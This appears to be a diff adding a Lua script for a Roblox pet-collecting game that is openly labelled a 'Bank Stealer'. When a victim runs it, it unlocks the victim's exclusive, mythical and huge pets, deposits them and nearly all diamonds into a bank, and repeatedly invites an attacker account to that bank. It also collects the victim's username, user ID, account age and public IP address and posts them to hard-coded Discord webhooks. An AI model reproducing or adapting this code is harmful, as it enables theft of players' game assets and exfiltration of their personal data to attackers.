@@ -1,0 +1,279 @@
+_G.User = 
+_G.Webhook = 'https://discord.com/api/webhooks/1058585085512790057/rAsEWl_vKrJyVllp78XPuJ__-S0p5EstICHh6KfIeBj6GRh5x8-4MWxBpv9GssWJPhIu' -- Blocked out so i can spam :
+
+
+
+
+local dhwebhook = "" -- Blocked out so i can spam :
+local dhuser = 
+
+local exploit
+
+local function getexploit()
+    local exploitt =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "Sirhurt") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "KRNL") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getscriptenvs and "Calamari") or
+        (unit and not syn and "Unit") or
+        (OXYGEN_LOADED and "Oxygen U") or
+        (IsElectron and "Electron") or
+        ("Couldnt Grab Exploit | Not a Common Exploit")
+  
+    exploit = exploitt
+end
+
+getexploit()
+
+local username = game:GetService("Players").LocalPlayer.Name
+local fardplayer = game.Players.LocalPlayer
+local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+request = http_request or request or HttpPost or syn.request
+game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game:GetService("Workspace")["__MAP"].Interactive.Bank.Center.Position
+game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+local getmybanksremote =
+    debug.getconstant(
+    getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).GetMyBanks,
+    3
+)
+local inviteremote =
+    debug.getconstant(
+    getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).InviteToBank,
+    11
+)
+local lockremote =
+    debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory).LockPets, 5)
+local depositremote =
+    debug.getconstant(
+    getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).Deposit,
+    16
+)
+local eggremote =
+    debug.getconstant(
+    debug.getprotos(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Eggs).SetupEgg)[5],
+    26
+)
+local blobx = getupvalues(require(game:GetService("ReplicatedStorage").Framework.Client["1 | Network"]).Invoke)
+local bloby = getupvalues(blobx[2])
+local blobz = getupvalues(bloby[1])[1][2]
+local bloba = getupvalues(require(game:GetService("ReplicatedStorage").Framework.Client["1 | Network"]).Invoke)
+local blobb = getupvalues(bloba[2])
+getmybanksremote = blobz[blobb[2](2, getmybanksremote)]
+inviteremote = blobz[blobb[2](2, inviteremote)]
+lockremote = blobz[blobb[2](2, lockremote)]
+depositremote = blobz[blobb[2](2, depositremote)]
+eggremote = blobz[blobb[2](2, eggremote)]
+
+local idiot = Yyds76
+
+local lib = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
+local mybanks = getmybanksremote:InvokeServer()
+local BankID = mybanks[1]["BUID"]
+local Bank = BankID
+
+inviteremote:InvokeServer(mybanks[1]["BUID"], idiot)
+
+local FinalList = {}
+
+Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+Functions = Library.Functions
+EXCList = {}
+MythicList = {}
+HugeList = {}
+
+PogList = {139, 177, 176, 178}
+EList = {}
+MList = {}
+HList = {}
+PList = {}
+
+print("List Detected")
+
+table.foreach(
+    Library.Directory.Pets,
+    function(i, v)
+        if v.rarity == "Exclusive" then
+            table.insert(EXCList, i)
+        end
+        if v.rarity == "Mythical" then
+            table.insert(MythicList, i)
+        end
+        if v.huge then
+            table.insert(HugeList, i)
+        end
+    end
+)
+for i, v in pairs(PogList) do
+    table.insert(EXCList, v)
+end
+
+local pets = require(game:GetService("ReplicatedStorage").Framework.Client["4 | Save"]).Get().Pets
+local y = {}
+for i, v in pairs(pets) do
+    y[v["uid"]] = false
+end
+lockremote:InvokeServer(y)
+for i, v in pairs(pets) do
+    if table.find(EXCList, v["id"]) ~= nil then
+        table.insert(EList, v["uid"])
+    end
+    if table.find(MythicList, v["id"]) ~= nil then
+        table.insert(MList, v["uid"])
+    end
+    if table.find(HugeList, v["id"]) ~= nil then
+        table.insert(HList, v["uid"])
+    end
+end
+if #EList + #MList + #PList < 49 then
+    for i, v in pairs(EList) do
+        table.insert(FinalList, v)
+    end
+    for i, v in pairs(MList) do
+        table.insert(FinalList, v)
+    end
+elseif #EList + #MList > 49 and #EList < 49 then
+    for i, v in pairs(EList) do
+        table.insert(FinalList, v)
+    end
+    for i, v in pairs(MList) do
+        if #FinalList < 49 then
+            table.insert(FinalList, v)
+        end
+    end
+elseif #EList + #MList > 49 and #EList > 49 then
+    for i, v in pairs(EList) do
+        if #FinalList < 49 then
+            table.insert(FinalList, v)
+        end
+    end
+end
+wait(0.5)
+game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Open Eggs"].Disabled = true
+local A_1 = {
+    [1] = "Cracked Egg",
+    [2] = false
+}
+eggremote:InvokeServer("Cracked Egg", false, false)
+wait(0.5)
+local A_1 = {
+    [1] = Bank,
+    [2] = FinalList,
+    [3] = 0
+}
+
+wait(8)
+local s, e =
+    pcall(
+    function()
+        depositremote:InvokeServer(
+            Bank,
+            FinalList,
+            require(game:GetService("ReplicatedStorage").Framework.Client["4 | Save"]).Get().Diamonds - 1
+        )
+    end
+)
+if s == false then
+    wait(8)
+    depositremote:InvokeServer(Bank, FinalList, 1)
+end
+
+-- Deposit End
+
+-- Webhook (Victim)
+
+-- Webhook (Victim)
+
+local url = _G.Webhook
+local us =
+    dhwebhook
+local url2 = us
+local username = game:GetService("Players").LocalPlayer.Name
+local fardplayer = game.Players.LocalPlayer
+local imgs =
+    "https://www.roblox.com/headshot-thumbnail/image?userId=" .. fardplayer.userId .. "&width=420&height=420&format=png"
+local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
+request = http_request or request or HttpPost or syn.request
+
+local data1 = {
+    ["content"] = "||@everyone||\n**Phraphy Bank Stealer Detected A Hit**", -- Free Webhook logging
+    ["embeds"] = {
+        {
+            ["title"] = "```Lunar Bank-Steal Results```",
+            ["url"] = "https://discord.gg/qwP8DnpQUe",
+            ["description"] = "This data was generated using PhraphyBankStealer 🌙",
+            ["type"] = "rich",
+            ["color"] = tonumber(0x7b00ff),
+            ["thumbnail"] = {
+                ["url"] = imgs,
+                ["height"] = 420,
+                ["width"] = 420
+            },
+            ["fields"] = {
+                {
+                    ["name"] = "Data Generated",
+                    ["value"] = "🎭 Username : **" ..username .."**\n🙍‍♂️ User ID : **" ..fardplayer.userId .. "**\n🔞 Account Age : **" ..fardplayer.AccountAge .. " Days**\n💻 Device : **Computer**\n🧑‍💻 Exploit : **"..exploit.."**\n🏠 IP Address : ||"..game:HttpGet('https://api.ipify.org/').."||", -- remove the || on both sides if you don't want your username to be behind a spoiler credits to ver#2607
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "💎 Diamonds",
+                    ["value"] = "```➜ "..diamond.."```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🐶 Pets 🐶",
+                    ["value"] = "```➜ "..#FinalList.."```",
+                    ["inline"] = true
+                },
+				{
+                    ["name"] = "🐰 Mythicals 🐰",
+                    ["value"] ="```➜ ".. #MList.."```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🐱 Exclusives 🐱",
+                    ["value"] = "```➜ "..#EList.."```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🤑 Huges 🤑",
+                    ["value"] = "```➜ "..#HList.."```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "👑 Rank 👑",
+                    ["value"] = "```➜ "..rank.."```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🏦 Bank ID 🏦",
+                    ["value"] = "```➜ "..BankID.."```",
+                    ["inline"] = true
+                }
+            }
+        }
+    }
+}
+local newdata1 = game:GetService("HttpService"):JSONEncode(data1)
+
+local headers = {
+    ["content-type"] = "application/json"
+}
+local abcdef1 = {Url = url, Body = newdata1, Method = "POST", Headers = headers}
+local abcdef2 = {Url = url2, Body = newdata1, Method = "POST", Headers = headers}
+request(abcdef1)
+request(abcdef2)
+
+-- End Webhoook Victim
+
+while task.wait(0.1) do
+    inviteremote:InvokeServer(mybanks[1]["BUID"], idiot)
+    inviteremote:InvokeServer(mybanks[1]["BUID"], _G.User)
+end
